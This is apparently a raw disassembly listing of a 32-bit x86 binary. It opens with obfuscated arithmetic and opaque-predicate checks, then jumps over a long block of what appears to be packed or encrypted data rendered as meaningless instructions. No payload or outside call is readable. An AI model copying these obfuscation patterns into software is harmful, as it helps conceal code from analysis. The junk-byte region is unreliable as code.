  4113cc:	mov    ecx,DWORD PTR [ebp-0xc]
  4113cf:	or     eax,ecx
  4113d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4113d4:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  4113db:	add    eax,0x40e5
  4113e0:	imul   eax,eax,0x214c
  4113e6:	add    eax,ecx
  4113e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4113eb:	add    ecx,eax
  4113ed:	mov    DWORD PTR [ebp+0x8],ecx
  4113f0:	mov    eax,DWORD PTR [ebp-0x24]
  4113f3:	mov    ecx,DWORD PTR [ebp-0x28]
  4113f6:	and    eax,ecx
  4113f8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4113fb:	and    eax,ecx
  4113fd:	mov    ecx,DWORD PTR [ebp-0x30]
  411400:	imul   eax,ecx
  411403:	mov    ecx,DWORD PTR [ebp-0x34]
  411406:	or     eax,ecx
  411408:	mov    ecx,DWORD PTR [ebp-0x38]
  41140b:	imul   eax,ecx
  41140e:	mov    ecx,DWORD PTR [ebp+0x8]
  411411:	sub    eax,0x777ea653
  411416:	cmp    DWORD PTR [ecx+0x54],eax
  411419:	je     0x411427
  41141f:	mov    eax,DWORD PTR [ebp+0x8]
  411422:	jmp    0x41146e
  411427:	mov    eax,DWORD PTR [ebp-0x3c]
  41142a:	sub    eax,0x5258
  41142f:	xor    eax,0x49e9
  411434:	add    eax,0x253
  411439:	jmp    0x41146e
  41143e:	mov    DWORD PTR [ebp-0x3c],0x4177
  411445:	mov    DWORD PTR [ebp+0x8],0x1405
  41144c:	mov    eax,DWORD PTR [ebp+0x8]
  41144f:	mov    ecx,DWORD PTR [ebp-0x3c]
  411452:	imul   eax,eax,0x58cc
  411458:	add    eax,0x3f39
  41145d:	and    eax,ecx
  41145f:	add    eax,0x3b90
  411464:	or     eax,0x4b1c
  411469:	sub    eax,0x7fdd
  41146e:	leave  
  41146f:	ret    0x4
  411472:	push   ebp
  411473:	mov    ebp,esp
  411475:	and    esp,0xfffffff8
  411478:	sub    esp,0x20
  41147b:	push   ebx
  41147c:	push   esi
  41147d:	lea    eax,[esp+0x10]
  411481:	mov    DWORD PTR [esp+0xc],eax
  411485:	mov    eax,DWORD PTR [esp+0xc]
  411489:	mov    ecx,DWORD PTR [esp+0x10]
  41148d:	mov    edx,DWORD PTR [esp+0x14]
  411491:	sub    DWORD PTR [eax],ecx
  411493:	sbb    DWORD PTR [eax+0x4],edx
  411496:	mov    eax,DWORD PTR [esp+0xc]
  41149a:	or     DWORD PTR [eax],0xcb7db576
  4114a0:	or     DWORD PTR [eax+0x4],0x9c2b8ae8
  4114a7:	lea    eax,[esp+0x18]
  4114ab:	jmp    0x41183a
  4114b0:	test   al,0x7c
  4114b2:	or     BYTE PTR [esp+ebx*1-0x44],ch
  4114b6:	lods   al,BYTE PTR ds:[esi]
  4114b7:	mov    esp,0x92465201
  4114bc:	std    
  4114bd:	nop
  4114be:	mov    WORD PTR [esp+edx*8-0x664141ac],fs
  4114c5:	les    edi,FWORD PTR [esi-0xfcce842]
  4114cb:	xchg   ecx,eax
  4114cc:	ins    BYTE PTR es:[edi],dx
  4114cd:	sub    dl,BYTE PTR [eax]
  4114cf:	in     eax,0x78
  4114d1:	scas   al,BYTE PTR es:[edi]
  4114d2:	int3   
  4114d3:	add    DWORD PTR [ebx-0x46],esp
  4114d6:	xchg   BYTE PTR [ebp-0x55],cl
  4114d9:	or     edx,DWORD PTR [edx]
  4114db:	aam    0x88
  4114dd:	cmp    al,0xe4
  4114df:	cmp    eax,ebp
  4114e1:	les    edx,FWORD PTR [edi-0x793ca9bf]
  4114e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e8:	mov    ebp,0x10b61f32
  4114ed:	push   esp
  4114ee:	pop    esp
  4114ef:	or     ch,bl
  4114f1:	push   esi
  4114f2:	sub    eax,0x73234576
  4114f7:	pop    esi
  4114f8:	mov    edi,0x3ea245ad
  4114fd:	pop    ss
  4114fe:	mov    ebp,ecx
  411500:	hlt    
  411501:	mov    cl,0xe9
  411503:	sub    eax,0x13ed0868
  411508:	pop    es
  411509:	push   ebp
  41150a:	ss scas al,BYTE PTR es:[edi]
  41150c:	mov    WORD PTR [ebx+0x12],?
  41150f:	adc    BYTE PTR [ebx],cl
  411511:	jecxz  0x411514
  411513:	imul   esp,DWORD PTR [ebx],0x1e
  411516:	mov    eax,0xd2c3c54e
  41151b:	lea    ebp,[esi]
  41151d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41151e:	push   edi
  41151f:	aad    0x93
  411521:	jns    0x4114cb
  411523:	(bad)  
  411524:	call   0xb16a:0x57f020ee
  41152b:	outs   dx,DWORD PTR ds:[esi]
  41152c:	cmp    eax,0x97ba2b79
  411531:	xchg   ebp,eax
  411532:	dec    edx
  411533:	pop    eax
  411534:	(bad)  
  411535:	inc    edi
  411536:	push   ss
  411537:	inc    esp
  411538:	cmp    al,0x24
  41153a:	xchg   ebp,eax
  41153b:	cmp    BYTE PTR [edx+ebx*2-0x15],0x90
  411540:	cwde   
  411541:	mov    ecx,0x6596b64
  411546:	cmp    eax,ebp
  411548:	xor    ebx,eax
  41154a:	sub    esi,DWORD PTR [edx]
  41154c:	out    0x1f,al
  41154e:	loopne 0x411559
  411550:	pushf  
  411551:	fcom   QWORD PTR [edi-0x637df48e]
  411557:	mov    ds:0x14677450,al
  41155c:	jne    0x411521
  41155e:	xchg   esi,eax
  41155f:	retf   
  411560:	ficom  WORD PTR [ebp+edi*1-0x2dc10390]
  411567:	push   cs
  411568:	mov    ds:0x1babe312,al
  41156d:	shr    BYTE PTR ss:[edx],1
  411570:	lahf   
  411571:	pushf  
  411572:	sahf   
  411573:	nop
  411574:	arpl   WORD PTR [eax+ebp*2-0xac9c160],di
  41157b:	sbb    eax,DWORD PTR [ecx-0x75ff681a]
  411581:	out    dx,eax
  411582:	repz fs xchg esi,eax
  411585:	nop
  411586:	sbb    al,0x8a
  411588:	jg     0x411568
  41158a:	xchg   esi,eax
  41158b:	mov    WORD PTR [eax+0x1872d02e],fs
  411591:	xchg   esi,eax
  411592:	xor    dl,dh
  411594:	(bad)  
  411595:	push   esp
  411596:	popa   
  411597:	repz pop esp
  411599:	test   al,0xb6
  41159b:	inc    ebp
  41159c:	xor    dl,BYTE PTR [ecx]
  41159e:	and    al,0x74
  4115a0:	mov    WORD PTR [edi+ebp*2-0x56970a2],ss
  4115a7:	inc    edi
  4115a8:	xchg   DWORD PTR [eax],esp
  4115aa:	jl     0x41157b
  4115ac:	stos   BYTE PTR es:[edi],al
  4115ad:	jmp    0x4115dd
  4115af:	inc    eax
  4115b0:	add    al,0xbf
  4115b2:	call   0x7a08:0x8fd3f57a
  4115b9:	in     al,dx
  4115ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115bb:	push   ecx
  4115bc:	cmp    cl,bh
  4115be:	fmul   QWORD PTR [ebx+0x62afb647]
  4115c4:	pop    ebp
  4115c5:	pop    esi
  4115c6:	out    0x62,eax
  4115c8:	call   FWORD PTR [ebx]
  4115ca:	or     eax,0xbd3e3b0c
  4115cf:	xor    dh,BYTE PTR [esi]
  4115d1:	jmp    0xeecc9c7
  4115d6:	test   DWORD PTR [edi],ebx
  4115d8:	adc    eax,0x601f116
  4115dd:	push   ebp
  4115de:	fistp  QWORD PTR [edx-0x7f]
  4115e1:	pop    ecx
  4115e2:	aas    
  4115e3:	pop    ecx
  4115e4:	popf   
  4115e5:	inc    esi
  4115e6:	popf   
  4115e7:	and    DWORD PTR [edi+0x22e5a5d3],ecx
  4115ed:	ins    BYTE PTR es:[edi],dx
  4115ee:	aad    0xf
  4115f0:	fucomp st(7)
  4115f2:	popf   
  4115f3:	push   cs
  4115f4:	mov    eax,ds:0xd3922851
  4115f9:	xchg   esp,eax
  4115fa:	into   
  4115fb:	icebp  
  4115fc:	add    DWORD PTR [esi+0x3a],ebx
  4115ff:	iret   
  411600:	in     al,dx
  411601:	or     DWORD PTR [esi+0x78],edx
  411604:	int3   
  411605:	fisub  WORD PTR [ecx+eax*4+0x6c29df96]
  41160c:	jo     0x411646
  41160e:	popf   
  41160f:	inc    esp
  411610:	sub    al,0xba
  411612:	xor    al,0xc3
  411614:	in     eax,dx
  411615:	not    BYTE PTR [esi]
  411617:	xchg   esi,eax
  411618:	aaa    
  411619:	jge    0x41160c
  41161b:	gs out 0x74,al
  41161e:	mov    al,ds:0x1a070534
  411623:	inc    eax
  411624:	aaa    
  411625:	mov    esi,0x3b87a82f
  41162a:	das    
  41162b:	test   ebp,0x4455b8db
  411631:	mov    ch,0x7e
  411633:	jno    0x41167f
  411635:	inc    edx
  411636:	add    DWORD PTR [edi-0x71c4dd06],ebx
  41163c:	ins    DWORD PTR es:[edi],dx
  41163d:	shl    esp,0x11
  411640:	lock push edx
  411642:	scas   al,BYTE PTR es:[edi]
  411643:	addr16 inc edi
  411645:	stos   BYTE PTR es:[edi],al
  411646:	sub    al,0xea
  411648:	cli    
  411649:	push   esi
  41164a:	pop    edi
  41164b:	jge    0x41160b
  41164d:	aaa    
  41164e:	enter  0xbb46,0x38
  411652:	not    BYTE PTR [ebx]
  411654:	and    al,0xaf
  411656:	mov    ah,0x20
  411658:	lods   al,BYTE PTR ds:[esi]
  411659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41165a:	ficom  DWORD PTR [edi+ebp*8]
  41165d:	cmp    ch,al
  41165f:	cdq    
  411660:	push   edx
  411661:	int    0x83
  411663:	xchg   ebp,eax
  411664:	inc    esp
  411665:	sbb    BYTE PTR [edx],bl
  411667:	inc    edi
  411668:	xchg   edi,eax
  411669:	shl    DWORD PTR [ecx],1
  41166b:	mov    BYTE PTR [esi+0x7],ch
  41166e:	shr    BYTE PTR [edi-0x6d],1
  411671:	int3   
  411672:	in     eax,dx
  411673:	jno    0x4116e6
  411675:	inc    edx
  411676:	dec    ebx
  411677:	pop    ebx
  411678:	sbb    edx,ebp
  41167a:	stc    
  41167b:	push   eax
  41167c:	sub    BYTE PTR [ecx],ah
  41167e:	hlt    
  41167f:	repnz mov esi,0x38127731
  411685:	add    BYTE PTR [ebp-0x3b],ah
  411688:	xchg   edx,eax
  411689:	outs   dx,BYTE PTR ds:[esi]
  41168a:	ret    0xd185
  41168d:	pop    ecx
  41168e:	jnp    0x4116fb
  411690:	xor    al,0xde
  411692:	repz or bl,ch
  411695:	(bad)  
  411696:	out    0xcd,al
  411698:	mov    esi,0xa10a9582
  41169d:	sub    esi,DWORD PTR [edx]
  41169f:	leave  
  4116a0:	jge    0x4116b3
  4116a2:	cmp    al,0x83
  4116a4:	mov    esi,0xef1ce3ad
  4116a9:	repnz retf 
  4116ab:	test   BYTE PTR [ebx+eiz*4+0x49b9e9fe],bl
  4116b2:	add    DWORD PTR [edx+0x7c53c7a8],esp
  4116b8:	sub    bl,cl
  4116ba:	mov    ebp,0x6b0a1777
  4116bf:	cmp    dh,bl
  4116c1:	imul   eax,DWORD PTR [ebx+edx*2-0x56901f9e],0x64
  4116c9:	(bad)  
  4116ca:	jp     0x411703
  4116cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116cd:	jne    0x411652
  4116cf:	dec    edi
  4116d0:	bound  esi,QWORD PTR [esi-0x5cc98545]
  4116d6:	fidivr WORD PTR [ecx]
  4116d8:	push   0xffffff80
  4116da:	call   0x5e7e49d9
  4116df:	test   cl,bl
  4116e1:	sbb    ebp,DWORD PTR [ebx+edi*8-0x25]
  4116e5:	adc    BYTE PTR [eax-0x7e],0x7f
  4116e9:	xlat   BYTE PTR ds:[ebx]
  4116ea:	aaa    
  4116eb:	push   esi
  4116ec:	xchg   ebp,eax
  4116ed:	test   DWORD PTR ds:0x8897bf8c,edi
  4116f3:	jl     0x41172e
  4116f5:	xor    al,0x1d
  4116f7:	cmp    BYTE PTR [ebx+ecx*1],bh
  4116fa:	loope  0x4116b8
  4116fc:	xchg   edi,eax
  4116fd:	gs and eax,0x1ec8f62d
  411703:	cld    
  411704:	mov    WORD PTR [eax+0x54dcec55],fs
  41170a:	pop    esp
  41170b:	xor    ah,0x9f
  41170e:	mov    edx,0xac8b98bd
  411713:	or     DWORD PTR [edi+0x50],0x24
  411717:	pop    edx
  411718:	add    al,0xf3
  41171a:	mov    bh,0xac
  41171c:	push   ss
  41171d:	jae    0x4116b1
  41171f:	out    0x67,eax
  411721:	or     ebx,DWORD PTR [ebp+edi*1-0x2064b885]
  411728:	jno    0x4116b1
  41172a:	and    bh,BYTE PTR [edx+ebx*2-0x55f25a8b]
  411731:	fwait
  411732:	mov    ds:0x1acc6f,eax
  411737:	push   es
  411738:	sahf   
  411739:	hlt    
  41173a:	jo     0x411744
  41173c:	lahf   
  41173d:	mov    al,ds:0xdb641213
  411742:	shr    dh,0x3c
  411745:	xor    BYTE PTR [ebp+0x25617856],bh
  41174b:	mov    esi,0x1e355c78
  411750:	daa    
  411751:	push   esp
  411752:	or     ecx,DWORD PTR [esi+0x12331c5f]
  411758:	cmp    ah,dh
  41175a:	call   0x4f1a432f
  41175f:	cmp    ebx,DWORD PTR [eax]
  411761:	xor    DWORD PTR [edi],ecx
  411763:	aad    0x4c
  411765:	ins    DWORD PTR es:[edi],dx
  411766:	shr    DWORD PTR [edx],0xb2
  411769:	repz cmp BYTE PTR [edx+0x2a],dh
  41176d:	pusha  
  41176e:	ds sbb al,0x41
  411771:	jecxz  0x4117af
  411773:	inc    edx
  411774:	(bad)  
  411775:	dec    DWORD PTR [ebx-0x85dd578]
  41177b:	mov    es,WORD PTR [eax+esi*8-0xe]
  41177f:	mov    edi,0xf24f5e56
  411784:	mov    bh,0xb
  411786:	push   esi
  411787:	stc    
  411788:	or     al,0x72
  41178a:	dec    edi
  41178b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41178c:	sub    edx,DWORD PTR [esi+ebx*2]
  41178f:	loope  0x41178f
  411791:	test   eax,0x858017ee
  411796:	(bad)  
  411797:	pop    ebx
  411798:	jmp    0x4117db
  41179a:	cmp    eax,0xbfda988c
  41179f:	jnp    0x411761
  4117a1:	inc    ebx
  4117a2:	xlat   BYTE PTR ds:[ebx]
  4117a3:	in     al,0x54
  4117a5:	mov    dl,0x9d
  4117a7:	mov    ecx,0x29bc7332
  4117ac:	(bad)  
  4117ad:	xor    al,0x4f
  4117af:	fcom   DWORD PTR [edx-0x1f]
  4117b2:	fld    QWORD PTR [ecx]
  4117b4:	pop    es
  4117b5:	cmp    al,0x13
  4117b7:	dec    esp
  4117b8:	(bad)
  4117bc:	fs xchg edx,eax
  4117be:	test   BYTE PTR [eax-0x36815865],bh
  4117c4:	sub    DWORD PTR [edx-0x41],0x22
  4117c8:	lahf   
  4117c9:	into   
  4117ca:	ret    
  4117cb:	(bad)  
  4117cc:	sub    eax,0x192cdf6b
  4117d1:	popf   
  4117d2:	cmp    DWORD PTR [eax+eiz*1-0x33],0x59691951
  4117da:	xlat   BYTE PTR ds:[ebx]
  4117db:	lods   eax,DWORD PTR ds:[esi]
  4117dc:	daa    
  4117dd:	imul   BYTE PTR [ecx]
  4117df:	mov    ds:0x78545571,al
  4117e4:	dec    edi
  4117e5:	ret    
  4117e6:	out    0xee,eax
  4117e8:	push   0x73dbfbb2
  4117ed:	outs   dx,DWORD PTR ds:[esi]
  4117ee:	mov    dl,dh
  4117f0:	jmp    0x41178f
  4117f2:	mov    ebx,0xd0702b57
  4117f7:	imul   esp,DWORD PTR ds:0xac63f6eb,0xffffff85
  4117fe:	xchg   ecx,eax
  4117ff:	dec    DWORD PTR gs:[edi+eiz*4-0x12641807]
  411807:	dec    ecx
  411808:	aad    0x9
  41180a:	sbb    al,0xe
  41180c:	lock dec ebp
  41180e:	sbb    al,0xbd
  411810:	inc    BYTE PTR [edi-0x3b]
  411813:	or     ebx,DWORD PTR [esi]
  411815:	sbb    dl,ah
  411817:	arpl   WORD PTR [ecx+0x12],ax
  41181a:	or     DWORD PTR [ebp-0x6844707a],esp
  411820:	xor    al,0xee
  411822:	ja     0x4117a8
  411824:	aam    0x5e
  411826:	pop    esi
  411827:	inc    esi
  411828:	pop    ecx
  411829:	dec    edi
  41182a:	retf   0x5a4b
  41182d:	dec    edx
  41182e:	gs and ah,0x14
  411832:	pop    edi
  411833:	push   edi
  411834:	cmp    DWORD PTR [edi-0x6b4df219],ebx
  41183a:	push   eax
  41183b:	jmp    0x411bca
  411840:	xlat   BYTE PTR ds:[ebx]
  411841:	xchg   ebx,eax
  411842:	push   edx
  411843:	call   FWORD PTR [edx-0x30636400]
  411849:	fist   WORD PTR [eax-0x18e14c70]
  41184f:	jecxz  0x411800
  411851:	pop    edx
  411852:	mov    esi,0xbec499be
  411857:	mov    esi,0x945d793d
  41185c:	cdq    
  41185d:	jns    0x4117e0
  41185f:	and    DWORD PTR [esp+eiz*8+0x6aaf1da],edx
  411866:	ds das 
  411868:	or     esi,esp
  41186a:	outs   dx,DWORD PTR ds:[esi]
  41186b:	ret    0x5a1e
  41186e:	add    al,0x8
  411870:	inc    ecx
  411871:	out    dx,al
  411872:	mov    cl,0xed
  411874:	or     ecx,DWORD PTR [eax-0x20673edb]
  41187a:	retf   0x7f67
  41187d:	test   BYTE PTR [edx],ah
  41187f:	daa    
  411880:	js     0x4118d3
  411882:	and    dl,BYTE PTR [ebx+eax*8+0x0]
  411886:	sub    dh,BYTE PTR gs:[ebx-0x61dd7612]
  41188d:	mov    WORD PTR [eax+0x3a44bf2d],es
  411893:	(bad)  
  411894:	sti    
  411895:	test   BYTE PTR [esi+eiz*2+0x6a],cl
  411899:	les    edx,FWORD PTR ds:0xb42459e5
  41189f:	imul   esi,DWORD PTR [esi-0x44],0x87fe314f
  4118a6:	mov    ebx,0x59014838
  4118ab:	jp     0x4118d0
  4118ad:	sbb    ah,BYTE PTR [ebx-0x35]
  4118b0:	rol    ecx,cl
  4118b2:	ret    
  4118b3:	aad    0xd6
  4118b5:	gs (bad) 
  4118b8:	mov    esi,0x7741eed9
  4118bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118be:	inc    ebx
  4118bf:	jae    0x4118e4
  4118c1:	cdq    
  4118c2:	nop
  4118c3:	in     eax,dx
  4118c4:	out    0x55,eax
  4118c6:	sub    BYTE PTR [esi-0xd],bl
  4118c9:	cwde   
  4118ca:	push   cs
  4118cb:	stos   DWORD PTR es:[edi],eax
  4118cc:	mov    ah,0xa3
  4118ce:	dec    edx
  4118cf:	adc    cl,BYTE PTR [ebx+0xf84521e]
  4118d5:	not    ecx
  4118d7:	sbb    BYTE PTR cs:[edi-0x20],al
  4118db:	and    eax,0xbca65a63
  4118e0:	dec    ecx
  4118e1:	xchg   ebp,eax
  4118e2:	in     al,0x5c
  4118e4:	sub    eax,DWORD PTR [ebx]
  4118e6:	mov    bl,0x91
  4118e8:	out    dx,eax
  4118e9:	dec    esi
  4118ea:	bound  edi,QWORD PTR [ebx-0x1c]
  4118ed:	sub    BYTE PTR [ecx],dh
  4118ef:	sub    al,0xc2
  4118f1:	jmp    FWORD PTR [ebp-0x27c85d97]
  4118f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f8:	inc    ebx
  4118f9:	jmp    0x5524:0xc4fbc5ad
  411900:	clc    
  411901:	mov    ch,0x2
  411903:	repz sub eax,0x5b2a8306
  411909:	and    eax,0xe9da6619
  41190e:	sahf   
  41190f:	add    DWORD PTR [ebx+0x68],esp
  411912:	cdq    
  411913:	add    esp,DWORD PTR [ecx+0x2c]
  411916:	mov    eax,0x2f3c72ae
  41191b:	sbb    BYTE PTR [esi-0x5387b4f6],bh
  411921:	aam    0xac
  411923:	or     ch,al
  411925:	push   ss
  411926:	xchg   DWORD PTR [ecx+0xd8ddfc5],edi
  41192c:	fisttp QWORD PTR [edi]
  41192e:	out    0x9,eax
  411930:	push   ecx
  411931:	mov    eax,ds:0xd270b099
  411936:	push   edi
  411937:	sahf   
  411938:	test   eax,edi
  41193a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41193b:	(bad)  
  41193c:	adc    ecx,DWORD PTR [ebx]
  41193e:	cmp    al,0xf3
  411940:	leave  
  411941:	sbb    bl,bh
  411943:	push   ss
  411944:	popa   
  411945:	into   
  411946:	das    
  411947:	sbb    eax,0x1e5dd036
  41194c:	std    
  41194d:	adc    ebp,eax
  41194f:	fisubr DWORD PTR [ebx+0x6f9fe68]
  411955:	pop    DWORD PTR [eax+0x1f]
  411958:	cmp    BYTE PTR [ecx],ch
  41195a:	enter  0x30b2,0x1f
  41195e:	sti    
  41195f:	in     al,dx
  411960:	dec    esi
  411961:	jge    0x411939
  411963:	and    DWORD PTR [ebx-0x4],eax
  411966:	call   0xeb5d5b4c
  41196b:	adc    dh,bl
  41196d:	in     al,0xf3
  41196f:	mov    esi,0x3cefb9e
  411974:	xor    eax,ecx
  411976:	repz pop edi
  411978:	xor    eax,0x5ee3bbea
  41197d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41197e:	add    esp,DWORD PTR [esi+0x2d]
  411981:	xchg   edx,eax
  411982:	pop    es
  411983:	rcr    BYTE PTR [ebp+0x13],cl
  411986:	(bad)  [edi+0x23]
  411989:	xchg   esp,eax
  41198a:	pop    esi
  41198b:	(bad)  
  41198c:	jle    0x4119e1
  41198e:	lahf   
  41198f:	pop    es
  411990:	int3   
  411991:	sub    BYTE PTR [esi-0x550ca3fa],cl
  411997:	cmp    BYTE PTR [ecx+0x68],dl
  41199a:	lds    ebp,FWORD PTR [edx]
  41199c:	mov    fs,esi
  41199e:	cs loopne 0x41192e
  4119a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a2:	cdq    
  4119a3:	mov    fs,WORD PTR [edi-0x4c]
  4119a6:	mov    ds:0x26c06148,al
  4119ab:	sbb    DWORD PTR [ebx],edx
  4119ad:	ficomp DWORD PTR [edx-0x465536f2]
  4119b3:	inc    ebx
  4119b4:	mov    bl,0x8e
  4119b6:	add    eax,0x50162e07
  4119bb:	sahf   
  4119bc:	adc    esi,ebx
  4119be:	inc    esi
  4119bf:	test   eax,0x3fbc7f35
  4119c4:	ss mov edi,0x1df964a7
  4119ca:	mov    eax,ds:0x8feff55f
  4119cf:	ds mov ecx,0xc0b2b22
  4119d5:	xchg   ecx,eax
  4119d6:	cld    
  4119d7:	mov    dl,0x7c
  4119d9:	add    BYTE PTR [esi-0x31],cl
  4119dc:	in     al,0xf6
  4119de:	push   es
  4119df:	pop    es
  4119e0:	xchg   esp,eax
  4119e1:	push   es
  4119e2:	in     al,dx
  4119e3:	xchg   ebp,eax
  4119e4:	(bad)
  4119e7:	sbb    eax,0x185b0012
  4119ec:	fadd   QWORD PTR [edx-0x3036ebb5]
  4119f2:	xor    eax,0x6c2bd5d7
  4119f7:	sbb    eax,0xb907a4b1
  4119fc:	xor    BYTE PTR [esi],0x2f
  4119ff:	pop    eax
  411a00:	(bad)
  411a03:	sbb    eax,0xd1d036a3
  411a08:	shr    ebx,1
  411a0a:	sub    BYTE PTR [ecx-0x2b],dh
  411a0d:	mov    eax,ds:0x3c78d63d
  411a12:	push   0xffffffc9
  411a14:	das    
  411a15:	jge    0x4119b2
  411a17:	das    
  411a18:	inc    ebp
  411a19:	cld    
  411a1a:	pop    edx
  411a1b:	push   0xffffff85
  411a1d:	lock inc ebx
  411a1f:	lea    ecx,[ebx+0x4e]
  411a22:	(bad)  
  411a23:	je     0x4119eb
  411a25:	pusha  
  411a26:	or     ah,BYTE PTR [ebp-0x125fd123]
  411a2c:	mov    al,ds:0x67906a79
  411a31:	int    0x41
  411a33:	call   0xd3886a7
  411a38:	sti    
  411a39:	push   esp
  411a3a:	scas   eax,DWORD PTR es:[edi]
  411a3b:	js     0x4119fb
  411a3d:	adc    esp,ecx
  411a3f:	jl     0x411a60
  411a41:	mov    WORD PTR [edx+0x6b2d1035],?
  411a47:	jecxz  0x4119e6
  411a49:	adc    DWORD PTR [ecx*8+0x62e34a0],eax
  411a50:	call   0x36d4:0xfccc1d6
  411a57:	xchg   esi,eax
  411a58:	(bad)
  411a5b:	jp     0x411a00
  411a5d:	lock jge 0x411a40
  411a60:	fisttp DWORD PTR [ebp-0x4495ddfd]
  411a66:	lds    ebp,FWORD PTR ds:0x17e2f929
  411a6c:	test   al,0x87
  411a6e:	scas   al,BYTE PTR es:[edi]
  411a6f:	inc    eax
  411a70:	sti    
  411a71:	aad    0x14
  411a73:	outs   dx,BYTE PTR ds:[esi]
  411a74:	jo     0x411a3a
  411a76:	cmp    eax,0xd563ab63
  411a7b:	mov    ch,0x48
  411a7d:	jmp    0x2295:0x742965d0
  411a84:	mov    ds:0x145b5a8b,eax
  411a89:	dec    edi
  411a8a:	push   ss
  411a8b:	cwde   
  411a8c:	adc    ecx,ebp
  411a8e:	sbb    eax,0xa689c778
  411a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a94:	ins    BYTE PTR es:[edi],dx
  411a95:	cmp    eax,0x83b0532d
  411a9a:	xchg   esi,eax
  411a9b:	sub    eax,0x84271a12
  411aa0:	stos   DWORD PTR es:[edi],eax
  411aa1:	pushf  
  411aa2:	sub    al,bl
  411aa4:	adc    bh,BYTE PTR [ebx]
  411aa6:	cwde   
  411aa7:	stos   DWORD PTR es:[edi],eax
  411aa8:	shl    BYTE PTR [edx],0x6a
  411aab:	test   eax,0xab41ab2e
  411ab0:	shl    DWORD PTR [ebx+edx*4],1
  411ab3:	cmc    
  411ab4:	(bad)  
  411ab5:	lock jmp 0x2e5:0xdfb32b0d
  411abd:	pop    esp
  411abe:	and    cl,BYTE PTR [eax]
  411ac0:	(bad)  
  411ac1:	fistp  DWORD PTR [ebx]
  411ac3:	bound  edx,QWORD PTR [edi]
  411ac5:	repz sti 
  411ac7:	xchg   esp,eax
  411ac8:	outs   dx,BYTE PTR ds:[esi]
  411ac9:	test   DWORD PTR [eax+0x4e6269db],ebx
  411acf:	iret   
  411ad0:	add    DWORD PTR [ebx],esp
  411ad2:	sbb    BYTE PTR [ecx-0x24],cl
  411ad5:	xchg   esp,eax
  411ad6:	cwde   
  411ad7:	cmp    al,0x50
  411ad9:	jge    0x411ad0
  411adb:	outs   dx,DWORD PTR ds:[esi]
  411adc:	pushf  
  411add:	sub    eax,0x6bc17ecf
  411ae2:	adc    al,0x2c
  411ae4:	retf   
  411ae5:	mov    BYTE PTR [esp+eiz*8],ch
  411ae8:	(bad)  
  411aea:	xchg   edx,eax
  411aeb:	and    eax,0xfa1aaa3
  411af0:	adc    BYTE PTR [edi+0x16],cl
  411af3:	fiadd  DWORD PTR [ebx+0x62e97477]
  411af9:	sub    al,0xee
  411afb:	xchg   esi,eax
  411afc:	pop    edi
  411afd:	push   ebx
  411afe:	shl    ecx,1
  411b00:	cmc    
  411b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b02:	xor    BYTE PTR [ebx],0xca
  411b05:	xchg   BYTE PTR [esi+edi*4],cl
  411b08:	add    ebp,eax
  411b0a:	adc    BYTE PTR [esi],al
  411b0c:	sub    eax,0xa8287ad9
  411b11:	dec    ebx
  411b12:	cdq    
  411b13:	ins    BYTE PTR es:[edi],dx
  411b14:	and    BYTE PTR [ecx-0x71a10a04],ch
  411b1a:	add    edi,DWORD PTR [eax]
  411b1c:	sbb    al,0xbc
  411b1e:	inc    edi
  411b1f:	add    DWORD PTR [ebx+0x13],ebp
  411b22:	int3   
  411b23:	jmp    0x2b10:0x1450275b
  411b2a:	cdq    
  411b2b:	xor    al,0xce
  411b2d:	inc    esi
  411b2e:	mov    edx,edx
  411b30:	mov    ch,0xc6
  411b32:	adc    ch,BYTE PTR [ebp+eiz*8+0x3ecbb9c2]
  411b39:	pop    esp
  411b3a:	xlat   BYTE PTR ds:[ebx]
  411b3b:	(bad)  
  411b3c:	iret   
  411b3d:	dec    edi
  411b3e:	in     eax,dx
  411b3f:	mov    ebp,0x4e2f8476
  411b44:	loopne 0x411ae8
  411b46:	lods   eax,DWORD PTR ds:[esi]
  411b47:	sub    eax,0xe68eda6d
  411b4c:	xchg   ebp,eax
  411b4d:	std    
  411b4e:	jp     0x411b6e
  411b50:	out    dx,al
  411b51:	js     0x411ba2
  411b53:	out    0x1c,al
  411b55:	dec    edx
  411b56:	and    DWORD PTR [ebp+0x53],ecx
  411b59:	pop    es
  411b5a:	call   0x530d:0x889a5e4e
  411b61:	sub    DWORD PTR [edi],edi
  411b63:	jbe    0x411b77
  411b65:	mov    al,ds:0x1ae18681
  411b6a:	ret    0xd5e
  411b6d:	or     al,0xba
  411b6f:	sub    DWORD PTR [edi-0x31],ebx
  411b72:	mov    edx,esi
  411b74:	jae    0x411b17
  411b76:	fisttp WORD PTR [ebp+0x68e56556]
  411b7c:	aaa    
  411b7d:	add    al,BYTE PTR [esi-0x19]
  411b80:	mov    dl,0x7b
  411b82:	arpl   WORD PTR [esi],sp
  411b84:	mov    ecx,0xce22aa22
  411b89:	int    0xe1
  411b8b:	push   0x31d5895b
  411b90:	int    0x1b
  411b92:	inc    eax
  411b93:	cmp    DWORD PTR [eax+0x3c],ecx
  411b96:	inc    ebp
  411b97:	rcr    BYTE PTR [edx+0x4c26ebe5],cl
  411b9d:	adc    eax,0x14f5c4d
  411ba2:	mov    edx,0x5600c308
  411ba7:	(bad)  
  411ba8:	push   eax
  411ba9:	out    0x1f,al
  411bab:	fcomip st,st(3)
  411bad:	rol    BYTE PTR [edi],cl
  411baf:	sub    DWORD PTR [eax],esp
  411bb1:	rol    DWORD PTR ds:0x5179e519,0x72
  411bb8:	cli    
  411bb9:	in     eax,dx
  411bba:	sbb    al,0xac
  411bbc:	push   0x7
  411bbe:	push   ss
